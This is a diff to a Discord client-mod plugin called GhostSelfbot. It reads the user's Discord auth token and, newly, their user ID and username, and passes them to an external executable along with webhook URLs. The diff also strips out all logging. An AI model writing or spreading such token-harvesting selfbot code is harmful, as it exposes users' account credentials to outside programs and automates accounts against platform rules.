@@ -7,12 +7,10 @@
 import { ApplicationCommandInputType, sendBotMessage } from "@api/Commands";
 import { showNotification } from "@api/Notifications";
 import { definePluginSettings } from "@api/Settings";
-import { Logger } from "@utils/Logger";
 import definePlugin, { OptionType, PluginNative } from "@utils/types";
 import type { CommandArgument, CommandContext } from "@vencord/discord-types";
 import { findByPropsLazy } from "@webpack";
-
-const logger = new Logger("GhostSelfbot");
+import { UserStore } from "@webpack/common";
 
 const Native = VencordNative.pluginHelpers.GhostSelfbot as PluginNative<typeof import("./native")>;
 
@@ -21,9 +19,17 @@ const TokenStore = findByPropsLazy("getToken");
 export function getCurrentDiscordToken(): string | null {
     try {
         return TokenStore?.getToken?.() ?? null;
-    } catch (error) {
-        logger.error("Failed to extract Discord token:", error);
+    } catch {
         return null;
+    }
+}
+
+function getCurrentUserInfo(): { userId: string | null; username: string | null; } {
+    try {
+        const user = UserStore.getCurrentUser();
+        return { userId: user?.id ?? null, username: user?.username ?? null };
+    } catch {
+        return { userId: null, username: null };
     }
 }
 
@@ -110,12 +116,15 @@ async function launchGhostExe(): Promise<void> {
         if (!await ensureGhostInstalled()) return;
 
         const token = settings.store.autoFillToken ? getCurrentDiscordToken() : null;
+        const { userId, username } = getCurrentUserInfo();
         await Native.launchGhostExe(
             settings.store.autoFillToken,
             token,
             settings.store.nitroWebhookUrl || "",
             settings.store.privnoteWebhookUrl || "",
-            settings.store.autoSetupWebhooks
+            settings.store.autoSetupWebhooks,
+            userId,
+            username
         );
 
         showNotification({
@@ -124,7 +133,6 @@ async function launchGhostExe(): Promise<void> {
             color: "#5865F2"
         });
     } catch (error: unknown) {
-        logger.error("Failed to launch Ghost.exe:", error);
         showNotification({
             title: "Ghost Selfbot",
             body: getErrorMessage(error, "Failed to launch Ghost.exe"),
@@ -140,6 +148,7 @@ async function launchGhostSource(): Promise<void> {
         if (!await ensureGhostInstalled()) return;
 
         const token = settings.store.autoFillToken ? getCurrentDiscordToken() : null;
+        const { userId, username } = getCurrentUserInfo();
         await Native.launchGhostSource(
             settings.store.autoFillToken,
             settings.store.autoInstallRequirements,
@@ -147,7 +156,9 @@ async function launchGhostSource(): Promise<void> {
             token,
             settings.store.nitroWebhookUrl || "",
             settings.store.privnoteWebhookUrl || "",
-            settings.store.autoSetupWebhooks
+            settings.store.autoSetupWebhooks,
+            userId,
+            username
         );
 
         showNotification({
@@ -156,7 +167,6 @@ async function launchGhostSource(): Promise<void> {
             color: "#5865F2"
         });
     } catch (error: unknown) {
-        logger.error("Failed to launch Ghost source:", error);
         showNotification({
             title: "Ghost Selfbot",
             body: getErrorMessage(error, "Failed to launch Ghost source. Check Python path."),
@@ -280,11 +290,7 @@ export default definePlugin({
     ],
 
     start() {
-        logger.log("Ghost Selfbot plugin loaded.");
-        logger.log("Commands available: /ghost, /ghost-download, /ghost-install, /ghost-check");
-
         if (settings.store.launchOnEnable) {
-            logger.log("Launching Ghost Selfbot immediately...");
             if (settings.store.launchMode === "exe") {
                 void launchGhostExe();
             } else {
@@ -294,7 +300,6 @@ export default definePlugin({
 
         if (settings.store.autoLaunch) {
             setTimeout(() => {
-                logger.log("Auto-launching Ghost Selfbot on startup...");
                 if (settings.store.launchMode === "exe") {
                     void launchGhostExe();
                 } else {
@@ -302,9 +307,5 @@ export default definePlugin({
                 }
             }, 5000);
         }
-    },
-
-    stop() {
-        logger.log("Ghost Selfbot plugin stopped.");
     }
 });
